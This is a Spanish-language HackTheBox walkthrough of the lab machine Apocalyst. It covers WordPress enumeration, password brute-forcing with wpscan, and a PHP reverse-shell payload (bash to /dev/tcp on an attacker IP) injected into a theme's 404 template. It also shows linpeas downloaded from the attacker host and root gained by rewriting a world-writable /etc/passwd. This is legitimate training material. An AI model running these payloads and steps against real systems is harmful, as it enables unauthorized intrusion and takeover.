---
title: Apocalyst
description: Máquina Apocalyst de Hackthebox
date: 2024-08-03 23:20:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Linux
tags:
  - Information Leakage
  - Wordpress Exploitation
  - Wordpress Enumeration
  - Wordpress Bruteforce
  - Abusing misconfigured permissions [Privilege Escalation]
  - Image Stego Challenge - Steghide
image:
  path: /assets/img/Apocalyst/Apocalyst.png
---

## Skills

- Wordpress Exploitation - Theme Editor [RCE]
- Abusing misconfigured permissions [Privilege Escalation]
- Wordpress Enumeration
- Wordpress Bruteforce
- Image Stego Challenge - Steghide
- Information Leakage - User Enumeration
  
## Certificaciones

- eJPT
- eWPT
- OSCP (Escalada)
  
## Descripción

`Apocalyst` es una máquina `medium linux`, la `web` es un `Wordpress` así que obtenemos el usuario debido al `nombre` del `autor` de un artículo, nos montamos un `diccionario` con `cewl` y `fuzzeando rutas` con encontramos con una `imagen` con `contenido oculto`. El `contenido oculto` es una `lista` de `palabras`, usamos esta `lista` para `bruteforcear` el panel de `login` del `Wordpres` ganando así `acceso`, desde el `Wordpress` ganamos `acceso` a la máquina víctima `modificando` el archivo `404.php`. Una vez dentro vemos un `archivo` con la `contraseña` de un `usuario` lo que nos permite `cambiar` de `usuario`, posteriormente usamos `linpeas` para `analizar` el `sistema` y `sobrescribimos` el `/etc/passwd` convirtiéndonos así en usuario `root`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.156.119
PING 10.129.156.119 (10.129.156.119) 56(84) bytes of data.
64 bytes from 10.129.156.119: icmp_seq=1 ttl=63 time=63.5 ms
64 bytes from 10.129.156.119: icmp_seq=2 ttl=63 time=59.1 ms
64 bytes from 10.129.156.119: icmp_seq=3 ttl=63 time=55.5 ms
^C
--- 10.129.156.119 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 55.527/59.388/63.546/3.280 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`

```
# sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.156.119 -oG openPorts 
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 02:02 CEST
Initiating SYN Stealth Scan at 02:02
Scanning 10.129.156.119 [65535 ports]
Discovered open port 80/tcp on 10.129.156.119
Discovered open port 22/tcp on 10.129.156.119
Completed SYN Stealth Scan at 02:02, 13.63s elapsed (65535 total ports)
Nmap scan report for 10.129.156.119
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.72 seconds
           Raw packets sent: 66855 (2.942MB) | Rcvd: 66858 (2.674MB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p22,80 10.129.156.119 -oN services 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 02:03 CEST
Nmap scan report for 10.129.156.119
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apocalypse Preparation Blog
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Wordpress 4.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.78 seconds
```

### Web Enumeration

En la página `web` vemos lo siguiente

![](/assets/img/Apocalyst/image_1.png)

Al `pinchar` sobre el `enlace` nos `redirige` al dominio `apocalyst.htb`

![](/assets/img/Apocalyst/image_2.png)

`Añadimos` el `dominio` al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       Kali-Linux
10.129.156.119  apocalyst.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Al acceder nuevamente al servicio `web` vemos esto

![](/assets/img/Apocalyst/image_3.png)

Si `pinchamos` sobre un `artículo` podemos ver quién es su autor

![](/assets/img/Apocalyst/image_4.png)

Este `usuario` es un usuario `válido`, lo podemos comprobar en `/wp-login.php`

![](/assets/img/Apocalyst/image_5.png)

Como hay `mucho texto` en la web vamos a `crearnos` un `diccionario personalizado`

```
# cewl http://apocalyst.htb/ > wordlist.txt
```

`Fuzzeamos` con `wfuzz`

```
# wfuzz -c -t100 --hc 404 -w wordlist.txt --hh 157 -L http://apocalyst.htb/FUZZ   
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://apocalyst.htb/FUZZ
Total requests: 534

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000466:   200        14 L     20 W       175 Ch      "Rightiousness"                                                                                                       

Total time: 5.305344
Processed Requests: 534
Filtered Requests: 533
Requests/sec.: 100.6532
```

Vemos esto al acceder a `/Rightiousness`, con las demás rutas también veíamos esta imagen, sin embargo, los `caracteres` son `diferentes`, lo que significa que hay `información oculta`

![](/assets/img/Apocalyst/image_6.png)

`Vemos` el `contenido oculto` de la `imagen` debido a que no está protegida por ninguna contraseña

```
# teghide extract -sf image.jpg
Enter passphrase: 
wrote extracted data to "list.txt".
```

## Web Exploitation

Mediante `wpscan` hacemos `bruteforce` contra el `panel` de `login` del Wordpress

```
# wpscan --url http://apocalyst.htb -U falaraki -P list.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         Wordpress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://apocalyst.htb/ [10.129.156.119]
[+] Started: Sat Aug  3 03:42:12 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://apocalyst.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.Wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/Wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/Wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/Wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/Wordpress_pingback_access/

[+] Wordpress readme found: http://apocalyst.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://apocalyst.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://apocalyst.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-Wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] Wordpress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://apocalyst.htb/?feed=rss2, <generator>https://Wordpress.org/?v=4.8</generator>
 |  - http://apocalyst.htb/?feed=comments-rss2, <generator>https://Wordpress.org/?v=4.8</generator>

[+] Wordpress theme in use: twentyseventeen
 | Location: http://apocalyst.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://apocalyst.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.7
 | Style URL: http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://Wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the Wordpress team
 | Author URI: https://Wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <========================================================================================================> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - falaraki / Transclisiation                                                                                                                                                 
Trying falaraki / total Time: 00:01:02 <===========================================                                                                 > (335 / 821) 40.80%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: falaraki, Password: Transclisiation

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Aug  3 03:44:08 2024
[+] Requests Done: 508
[+] Cached Requests: 5
[+] Data Sent: 156.176 KB
[+] Data Received: 1.607 MB
[+] Memory used: 258.668 MB
[+] Elapsed time: 00:01:55 
```

Una vez `accedemos` al `Wordpress` con las credenciales `falaraki:Transclisiation` vemos lo siguiente

![](/assets/img/Apocalyst/image_7.png)

## Intrusión

A continuación vamos a mandarnos una reverse shell a nuestro equipo, para ello pulsamos en `Appearance` y luego en `Editor`

![](/assets/img/Apocalyst/image_8.png)

Pulsamos en el template `Error 404`

![](/assets/img/Apocalyst/image_9.png)

Vamos a inyectar este paylod en el código php de la plantilla

```
system("bash -c 'bash -i >& /dev/tcp/10.10.16.35/9993 0>&1'");
```

![](/assets/img/Apocalyst/image_10.png)

Una vez hecho nos pulsamos en `Update File` en la parte inferior de la web y nos ponemos en escucha mediante netcat por el puerto 9993

```
# nc -nlvp 9993
```

Debemos provocar un error en la web, para ello podemos acceder a `http://apocalyst.htb/?p=0`, al no existir ese artículo se produce un error y nos manda la shell

```
# nc -nlvp 9993 
listening on [any] 9993 ...
connect to [10.10.16.35] from (UNKNOWN) [10.129.156.119] 35388
bash: cannot set terminal process group (1587): Inappropriate ioctl for device
bash: no job control in this shell
www-data@apocalyst:/var/www/html/apocalyst.htb$ whoami
whoami
www-data
```

A continuación vamos a realizar un tratamiento a la `TTY`, para ello obtenemos las `dimensiones` de nuestra `pantalla` 

```
# stty size
45 183
```

Efectuamos el `tratamiento` a la `TTY`

```
# script /dev/null -c bash
[ENTER]
[CTRL + Z]
# stty raw -echo; fg
[ENTER]
# reset xterm
[ENTER]
# export TERM=xterm
[ENTER]
# export SHELL=bash
[ENTER]
# stty rows 45 columns 183
[ENTER]
```

Ya estamos en una `TTY` completamente `interactiva`

```
www-data@apocalyst:/var/www/html/apocalyst.htb$ whoami
www-data
```

## Privilege Escalation

`Obtenemos` las `credenciales` de la `base de datos` del `wp-config.php`, sin embargo, `no` nos `sirve de nada` debido a que en la `base de datos` no hay `nada interesante`

```
www-data@apocalyst:/var/www/html/apocalyst.htb$ cat wp-config.php
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'Th3SoopaD00paPa5S!');
```

Nos encontramos esto en el `directorio` de `falaraki`

```
www-data@apocalyst:/home/falaraki$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .nano  .profile  .secret  .sudo_as_admin_successful  .wp-config.php.swp  user.txt
www-data@apocalyst:/home/falaraki$ cat .secret
S2VlcCBmb3JnZXR0aW5nIHBhc3N3b3JkIHNvIHRoaXMgd2lsbCBrZWVwIGl0IHNhZmUhDQpZMHVBSU50RzM3VGlOZ1RIIXNVemVyc1A0c3M=
```

Como es `base64` podemos `descifrarlo` fácilmente

```
# echo S2VlcCBmb3JnZXR0aW5nIHBhc3N3b3JkIHNvIHRoaXMgd2lsbCBrZWVwIGl0IHNhZmUhDQpZMHVBSU50RzM3VGlOZ1RIIXNVemVyc1A0c3M= | base64 -d
Keep forgetting password so this will keep it safe!
Y0uAINtG37TiNgTH!sUzersP4ss
```

Nos `convertimos` en el usuario `falaraki`

```
www-data@apocalyst:/home/falaraki$ su falaraki
Password: 
falaraki@apocalyst:~$ whoami
falaraki
```

Nos descargamos `linpeas` [https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) y nos montamos un `servidor http` con `python` en el `directorio` donde se encuentra linpeas

```
# python -m http.server 80
```

Nos descargamos `linpeas` en la `máquina víctima`

```
falaraki@apocalyst:~$ wget http://10.10.16.35/linpeas.sh
--2024-08-03 19:30:55--  http://10.10.16.35/linpeas.sh
Connecting to 10.10.16.35:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 862777 (843K) [text/x-sh]
Saving to: ‘linpeas.sh.1’

linpeas.sh.1                                  100%[================================================================================================>] 842.56K   650KB/s    in 1.3s    

2024-08-03 19:30:56 (650 KB/s) - ‘linpeas.sh.1’ saved [862777/862777]
```

Al ejecutar `linpeas` vemos que tenemos `permisos` de `escritura` sobre el `/etc/passwd`, por lo tanto podemos `cambiarle` la `contraseña` a `cualquier usuario`

```
falaraki@apocalyst:~$ ls -l /etc/passwd
-rw-rw-rw- 1 root root 1670 Aug  3 19:26 /etc/passwd
```

Podemos ver el `tipo` de cifrado que se está empleando en el sistema

```
falaraki@apocalyst:~$ su root
Password: 
su: Authentication failure
falaraki@apocalyst:~$ ^C
falaraki@apocalyst:~$ cat /etc/login.defs | grep ENCRYPT_METHOD
# This variable is deprecated. You should use ENCRYPT_METHOD.
ENCRYPT_METHOD SHA512
# Only used if ENCRYPT_METHOD is set to SHA256 or SHA512.
```

`Generamos` un `contraseña` con `opensssl`

```
# openssl passwd -1

Password: 
Verifying - Password: 
$1$3Aq69l2R$roAAiqM88qPJVo9vf62c7/
```

Si le pasamos el `hash` creado a `hash-identifier` vemos que la contraseña es `md5`, funcionará igualmente debido a que tiene el `formato correcto`, es decir, es para `unix/linux`

```
# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $1$uUWdv7ml$cCzYWZkrwbzPRiJT5Kopr1

Possible Hashs:
[+] MD5(Unix)
```

Nos `abrimos` el `/etc/passwd` con nano y `cambiamos` la `x` que es donde va la `contraseña` por la `contraseña` que hemos `creado`

```
# nano /etc/passwd 
root:$1$3Aq69l2R$roAAiqM88qPJVo9vf62c7/:0:0:root:/root:/bin/bash
```

Nos `convertimos` en usuario `root`

```
falaraki@apocalyst:~$ su root
Password: 
root@apocalyst:/home/falaraki# whoami
root
```
